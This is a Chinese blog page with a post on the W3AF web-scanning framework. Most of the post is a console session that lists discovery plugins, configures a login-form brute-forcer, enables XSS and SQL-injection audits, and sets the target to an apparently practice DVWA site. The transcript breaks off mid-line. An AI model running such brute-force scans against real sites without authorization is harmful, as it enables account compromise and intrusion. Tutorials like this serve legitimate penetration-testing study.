<!DOCTYPE html>












  


<html class="theme-next gemini use-motion" lang="zh-CN">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">




  
  
    
    
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link rel="stylesheet" href="/lib/pace/pace-theme-loading-bar.min.css?v=1.0.2">























<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">

<link rel="stylesheet" href="/css/main.css?v=6.7.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.7.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.7.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.7.0">


  <link rel="mask-icon" href="/images/logo.svg?v=6.7.0" color="#222">







<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '6.7.0',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="桃李不言，下自成蹊">
<meta name="keywords" content="Share">
<meta property="og:type" content="website">
<meta property="og:title" content="JD1412">
<meta property="og:url" content="https://github.com/JD1412/JD1412.github.io.git/page/2/index.html">
<meta property="og:site_name" content="JD1412">
<meta property="og:description" content="桃李不言，下自成蹊">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="JD1412">
<meta name="twitter:description" content="桃李不言，下自成蹊">



  <link rel="alternate" href="/atom.xml" title="JD1412" type="application/atom+xml">




  <link rel="canonical" href="https://github.com/JD1412/JD1412.github.io.git/page/2/">



<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>JD1412</title>
  












  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>
    <a href="https://github.com/JD1412/JD1412.github.io.github" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewbox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">JD1412</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
      
        <p class="site-subtitle">黑色的眼睛</p>
      
    
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="切换导航栏">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">

    
    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">

    
    
    
      
    

    

    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">

    
    
    
      
    

    

    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-schedule">

    
    
    
      
    

    

    <a href="/schedule/" rel="section"><i class="menu-item-icon fa fa-fw fa-calendar"></i> <br>日程表</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-sitemap">

    
    
    
      
    

    

    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-commonweal">

    
    
    
      
    

    

    <a href="/404/" rel="section"><i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br>公益 404</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-about">

    
    
    
      
    

    

    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>

  </li>

      
      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
        </li>
      
    </ul>
  

  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://github.com/JD1412/JD1412.github.io.git/2019/01/14/W3AF-Web-Application-Attack-and-AUdit-Framework/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Healer">
      <meta itemprop="description" content="桃李不言，下自成蹊">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="JD1412">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/01/14/W3AF-Web-Application-Attack-and-AUdit-Framework/" class="post-title-link" itemprop="url">W3AF(Web Application Attack and AUdit Framework)</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-01-14 06:20:29 / 修改时间：06:21:02" itemprop="dateCreated datePublished" datetime="2019-01-14T06:20:29+08:00">2019-01-14</time>
            

            
              

              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/security/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<h1 id="W3AF-Web-Application-Attack-and-AUdit-Framework"><a href="#W3AF-Web-Application-Attack-and-AUdit-Framework" class="headerlink" title="W3AF   (Web Application Attack and AUdit Framework)"></a>W3AF   (Web Application Attack and AUdit Framework)</h1></blockquote>
<ul>
<li>这个书out了，看这个：<pre><code>https://bbs.ichunqiu.com/thread-15297-1-1.html
http://www.freebuf.com/articles/5472.html
</code></pre></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# cd /usr/share/w3af</span><br><span class="line"></span><br><span class="line">root@kali:/usr/share/w3af# ./w3af_console</span><br><span class="line">w3af&gt;&gt;&gt; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@bt:/pentest/web/w3af# ./w3af_console</span><br><span class="line">Checking if a new version is available in our SVN repository. Please wait...</span><br><span class="line">An error occured while updating: &apos;NoneType&apos; object is not iterable</span><br><span class="line">w3af&gt;&gt;&gt; plugins</span><br><span class="line">w3af/plugins&gt;&gt;&gt; list discovery</span><br><span class="line">|---------------------------------------------------------------------------|</span><br><span class="line">| Plugin name            | Status | Conf | Description                      |</span><br><span class="line">|---------------------------------------------------------------------------|</span><br><span class="line">| afd                    |        |      | Find out if the remote web       |</span><br><span class="line">|                        |        |      | server has an active filter (    |</span><br><span class="line">|                        |        |      | IPS or WAF ).                    |</span><br><span class="line">| allowedMethods         |        | Yes  | Enumerate the allowed methods of |</span><br><span class="line">|                        |        |      | an URL.                          |</span><br><span class="line">| archiveDotOrg          |        | Yes  | Search archive.org to find new   |</span><br><span class="line">|                        |        |      | pages in the target site.        |</span><br><span class="line">| bing_spider            |        | Yes  | Search Bing to get a list of new |</span><br><span class="line">|                        |        |      | URLs                             |</span><br><span class="line">| content_negotiation    |        | Yes  | Use content negotiation to find  |</span><br><span class="line">|                        |        |      | new resources.                   |</span><br><span class="line">| detectReverseProxy     |        |      | Find out if the remote web       |</span><br><span class="line">|                        |        |      | server has a reverse proxy.      |</span><br><span class="line">| detectTransparentProxy |        |      | Find out if your ISP has a       |</span><br><span class="line">|                        |        |      | transparent proxy installed.     |</span><br><span class="line">| digitSum               |        | Yes  | Take an URL with a number (      |</span><br><span class="line">|                        |        |      | index2.asp ) and try to find     |</span><br><span class="line">|                        |        |      | related files (index1.asp,       |</span><br><span class="line">|                        |        |      | index3.asp).                     |</span><br><span class="line">| dir_bruter             |        | Yes  | Finds Web server directories by  |</span><br><span class="line">|                        |        |      | bruteforcing.                    |</span><br><span class="line">| dnsWildcard            |        |      | Find out if www.site.com and     |</span><br><span class="line">|                        |        |      | site.com return the same page.   |</span><br><span class="line">| domain_dot             |        |      | Send a specially crafted request |</span><br><span class="line">|                        |        |      | with a dot after the domain      |</span><br><span class="line">|                        |        |      | (http://host.tld./) and analyze  |</span><br><span class="line">|                        |        |      | response.                        |</span><br><span class="line">| dotNetErrors           |        |      | Request specially crafted URLs   |</span><br><span class="line">|                        |        |      | that generate ASP.NET errors in  |</span><br><span class="line">|                        |        |      | order to gather information.     |</span><br><span class="line">| favicon_identification |        |      | Identify server software using   |</span><br><span class="line">|                        |        |      | favicon.                         |</span><br><span class="line">| findBackdoor           |        |      | Find web backdoors and web       |</span><br><span class="line">|                        |        |      | shells.                          |</span><br><span class="line">| findCaptchas           |        |      | Identify captcha images on web   |</span><br><span class="line">|                        |        |      | pages.                           |</span><br><span class="line">| findDVCS               |        |      | Find GIT, Mercurial (HG), and    |</span><br><span class="line">|                        |        |      | Bazaar (BZR) repositories        |</span><br><span class="line">| findGit                |        |      | Find GIT repositories            |</span><br><span class="line">| findvhost              |        |      | Modify the HTTP Host header and  |</span><br><span class="line">|                        |        |      | try to find virtual hosts.       |</span><br><span class="line">| fingerBing             |        | Yes  | Search Bing to get a list of     |</span><br><span class="line">|                        |        |      | users for a domain.              |</span><br><span class="line">| fingerGoogle           |        | Yes  | Search Google using the Google   |</span><br><span class="line">|                        |        |      | API to get a list of users for a |</span><br><span class="line">|                        |        |      | domain.                          |</span><br><span class="line">| fingerPKS              |        |      | Search MIT PKS to get a list of  |</span><br><span class="line">|                        |        |      | users for a domain.              |</span><br><span class="line">| fingerprint_WAF        |        |      | Identify if a Web Application    |</span><br><span class="line">|                        |        |      | Firewall is present and if       |</span><br><span class="line">|                        |        |      | possible identify the vendor and |</span><br><span class="line">|                        |        |      | version.                         |</span><br><span class="line">| fingerprint_os         |        |      | Fingerprint the remote operating |</span><br><span class="line">|                        |        |      | system using the HTTP protocol.  |</span><br><span class="line">| frontpage_version      |        |      | Search FrontPage Server Info     |</span><br><span class="line">|                        |        |      | file and if it finds it will     |</span><br><span class="line">|                        |        |      | determine its version.           |</span><br><span class="line">| ghdb                   |        | Yes  | Search Google for                |</span><br><span class="line">|                        |        |      | vulnerabilities in the target    |</span><br><span class="line">|                        |        |      | site.                            |</span><br><span class="line">| googleSpider           |        | Yes  | Search google using google API   |</span><br><span class="line">|                        |        |      | to get new URLs                  |</span><br><span class="line">| halberd                |        |      | Identify if the remote server    |</span><br><span class="line">|                        |        |      | has HTTP load balancers.         |</span><br><span class="line">| hmap                   |        | Yes  | Fingerprint the server type, i.e |</span><br><span class="line">|                        |        |      | apache, iis, tomcat, etc.        |</span><br><span class="line">| http_vs_https_dist     |        | Yes  | Determines the network distance  |</span><br><span class="line">|                        |        |      | between the http and https ports |</span><br><span class="line">|                        |        |      | for a target.                    |</span><br><span class="line">| importResults          |        | Yes  | Import URLs found by other       |</span><br><span class="line">|                        |        |      | tools.                           |</span><br><span class="line">| oracleDiscovery        |        |      | Find Oracle applications on the  |</span><br><span class="line">|                        |        |      | remote web server.               |</span><br><span class="line">| phishtank              |        | Yes  | Search the phishtank.com         |</span><br><span class="line">|                        |        |      | database to determine if your    |</span><br><span class="line">|                        |        |      | server is (or was) being used in |</span><br><span class="line">|                        |        |      | phishing scams.                  |</span><br><span class="line">| phpEggs                |        |      | Fingerprint the PHP version      |</span><br><span class="line">|                        |        |      | using documented easter eggs     |</span><br><span class="line">|                        |        |      | that exist in PHP.               |</span><br><span class="line">| phpinfo                |        |      | Search PHP Info file and if it   |</span><br><span class="line">|                        |        |      | finds it will determine the      |</span><br><span class="line">|                        |        |      | version of PHP.                  |</span><br><span class="line">| pykto                  |        | Yes  | A nikto port to python.          |</span><br><span class="line">| ria_enumerator         |        | Yes  | Fingerprint Rich Internet Apps - |</span><br><span class="line">|                        |        |      | Google Gears Manifest files,     |</span><br><span class="line">|                        |        |      | Silverlight and Flash.           |</span><br><span class="line">| robotsReader           |        |      | Analyze the robots.txt file and  |</span><br><span class="line">|                        |        |      | find new URLs                    |</span><br><span class="line">| serverHeader           |        | Yes  | Identify the server type based   |</span><br><span class="line">|                        |        |      | on the server header.            |</span><br><span class="line">| serverStatus           |        |      | Find new URLs from the Apache    |</span><br><span class="line">|                        |        |      | server-status cgi.               |</span><br><span class="line">| sharedHosting          |        | Yes  | Use Bing search to determine if  |</span><br><span class="line">|                        |        |      | the website is in a shared       |</span><br><span class="line">|                        |        |      | hosting.                         |</span><br><span class="line">| sitemapReader          |        |      | Analyze the sitemap.xml file and |</span><br><span class="line">|                        |        |      | find new URLs                    |</span><br><span class="line">| slash                  |        |      | Identify if the resource         |</span><br><span class="line">|                        |        |      | http://host.tld/spam/ and        |</span><br><span class="line">|                        |        |      | http://host.tld/spam are the     |</span><br><span class="line">|                        |        |      | same.                            |</span><br><span class="line">| spiderMan              |        | Yes  | SpiderMan is a local proxy that  |</span><br><span class="line">|                        |        |      | will collect new URLs.           |</span><br><span class="line">| urlFuzzer              |        | Yes  | Try to find backups, and other   |</span><br><span class="line">|                        |        |      | related files.                   |</span><br><span class="line">| urllist_txt            |        |      | Analyze the urllist.txt file and |</span><br><span class="line">|                        |        |      | find new URLs                    |</span><br><span class="line">| userDir                |        | Yes  | Try to find user directories     |</span><br><span class="line">|                        |        |      | like &quot;http://test/~user/&quot; and    |</span><br><span class="line">|                        |        |      | identify the remote OS based on  |</span><br><span class="line">|                        |        |      | the remote users.                |</span><br><span class="line">| webDiff                |        | Yes  | Compare a local directory with a |</span><br><span class="line">|                        |        |      | remote URL path.                 |</span><br><span class="line">| webSpider              |        | Yes  | Crawl the web application.       |</span><br><span class="line">| wordnet                |        | Yes  | Use the wordnet lexical database |</span><br><span class="line">|                        |        |      | to find new URLs.                |</span><br><span class="line">| wordpress_fingerprint  |        |      | Finds the version of a WordPress |</span><br><span class="line">|                        |        |      | installation.                    |</span><br><span class="line">| wsdlFinder             |        |      | Find web service definitions     |</span><br><span class="line">|                        |        |      | files.                           |</span><br><span class="line">| xssedDotCom            |        |      | Search in xssed.com to find      |</span><br><span class="line">|                        |        |      | xssed pages.                     |</span><br><span class="line">| yahooSiteExplorer      |        | Yes  | Search Yahoo&apos;s index using Yahoo |</span><br><span class="line">|                        |        |      | site explorer to get a list of   |</span><br><span class="line">|                        |        |      | URLs                             |</span><br><span class="line">| zone_h                 |        |      | Find out if the site was defaced |</span><br><span class="line">|                        |        |      | in the past.                     |</span><br><span class="line">|---------------------------------------------------------------------------|</span><br><span class="line">w3af/plugins&gt;&gt;&gt; bruteforce</span><br><span class="line">|----------------------------------------------------------------------------|</span><br><span class="line">| Plugin name     | Status | Conf | Description                              |</span><br><span class="line">|----------------------------------------------------------------------------|</span><br><span class="line">| basicAuthBrute  |        | Yes  | Bruteforce HTTP basic authentication.    |</span><br><span class="line">| formAuthBrute   |        | Yes  | Bruteforce HTML form authentication.     |</span><br><span class="line">|----------------------------------------------------------------------------|</span><br><span class="line">w3af/plugins&gt;&gt;&gt; bruteforce formAuthBrute</span><br><span class="line">w3af/plugins&gt;&gt;&gt; bruteforce config formAuthBrute</span><br><span class="line">w3af/plugins/bruteforce/config:formAuthBrute&gt;&gt;&gt; set passwdFile true</span><br><span class="line">w3af/plugins/bruteforce/config:formAuthBrute&gt;&gt;&gt; set usersFile True</span><br><span class="line">w3af/plugins/bruteforce/config:formAuthBrute&gt;&gt;&gt; back</span><br><span class="line">w3af/plugins&gt;&gt;&gt; audit xss,sqli</span><br><span class="line">w3af/plugins&gt;&gt;&gt; discovery webSpider</span><br><span class="line">w3af/plugins&gt;&gt;&gt; discovery config webSpider </span><br><span class="line">w3af/plugins/discovery/config:webSpider&gt;&gt;&gt; set onlyForward True</span><br><span class="line">w3af/plugins/discovery/config:webSpider&gt;&gt;&gt; back</span><br><span class="line">w3af/plugins&gt;&gt;&gt; target</span><br><span class="line">Unknown command &apos;target&apos;</span><br><span class="line">w3af/plugins&gt;&gt;&gt; back</span><br><span class="line">w3af&gt;&gt;&gt; target</span><br><span class="line">w3af/config:target&gt;&gt;&gt; set target http://www.dvssc.com/dvwa/index.php</span><br><span class="line">w3af/config:target&gt;&gt;&gt; back</span><br><span class="line">w3af&gt;&gt;&gt; plugins</span><br><span class="line">w3af/plugins&gt;&gt;&gt; output htmlFile</span><br><span class="line">w3af/plugins&gt;&gt;&gt; output config htmlFile</span><br><span class="line">w3af/plugins/output/config:htmlFile&gt;&gt;&gt; set verbose True</span><br><span class="line">w3af/plugins/output/config:htmlFile&gt;&gt;&gt; set fileName aa.html</span><br><span class="line">w3af/plugins/output/config:htmlFile&gt;&gt;&gt; back</span><br><span 